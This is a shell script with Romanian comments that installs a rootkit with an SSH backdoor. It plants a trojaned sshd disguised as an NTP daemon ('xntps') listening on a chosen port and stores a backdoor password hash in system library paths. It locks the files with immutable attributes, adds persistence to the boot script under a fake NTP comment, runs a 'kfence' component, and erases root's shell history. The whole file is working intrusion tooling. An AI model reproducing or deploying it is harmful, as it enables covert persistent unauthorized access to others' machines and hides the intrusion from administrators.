#!/bin/sh
#
# USAGE:
# ./setup [pass] [port]
#
# Cik greets to EsTeTicu k el m-a modificat ;-)
# si la totzi de pe canalele #Uanble.To.Join.Channel & #antionline !!
#


# Defines
dpass=mama
dport=221

# You dont need to edit anything below this
basedir=`pwd`

# Verificam dak esti root
if [ "$(whoami)" != "root" ]; then
echo "# ID doboticule !! NU eshti root !! Pentru ce vrei ROOT-Kit ??"
exit
fi

echo "# Oka sa instalam backdooru de ssh"

mkdir /lib/security 2>/dev/null
mkdir /lib/security/.config 2>/dev/null
mkdir /lib/security/.config/ssh 2>/dev/null

if test -n "$1" ; then
echo "# Ai pus Parola : $1"
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $1 > /etc/ld.so.hash
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7
else

echo "# Nu ai pus parola boule... am setat parola default : $dpass"
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $dpass > /etc/ld.so.hash
mkdir /lib/java
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7
fi

if test -n "$2" ; then
echo "# Ai pus portu la SSH : $2"
echo "Port $2" >> $basedir/ssh/sshd_config
cat $basedir/ssh/config >> $basedir/ssh/sshd_config ; rm -rf $basedir/ssh/config
else

echo "# Nu ai pus portu vaco... am setat portu default : $dport"
echo "Port $dport" >> $basedir/ssh/sshd_config
cat $basedir/ssh/config >> $basedir/ssh/sshd_config ; rm -rf $basedir/ssh/config
fi

echo "# Copiem toate belele"
mv $basedir/ssh/* /lib/security/.config/ssh/
chattr -AacdisSu /usr/sbin/xntps 2>/dev/null
cp /lib/security/.config/ssh/sshd /usr/sbin/xntps
mv /lib/security/.config/ssh/sshd /lib/security/.config/
chmod 755 /usr/sbin/xntps

echo "# Rulam backdooru, roaga-te sa mearga :)"
/usr/sbin/xntps -q
chattr +isa /usr/sbin/xntps

echo "# Bagam Start-up backdoor"
chattr -AacdisSu /etc/rc.d/rc.sysinit
echo "# Xntps (NTPv3 daemon) startup.." >> /etc/rc.d/rc.sysinit
echo "/usr/sbin/xntps -q" >> /etc/rc.d/rc.sysinit
chattr +is /etc/rc.d/rc.sysinit

echo "# Copiem si rulam kfence :P"
cp kfence /sbin
/sbin/kfence i

echo "# Un pic de curatzenie si GATA"
chattr -AacdisSu /root/.bash_history
rm -rf /root/.bash_history
touch /root/.bash_history
chattr +Aais /root/.bash_history

echo "# Gata moshule, Ai alt root ;-)"
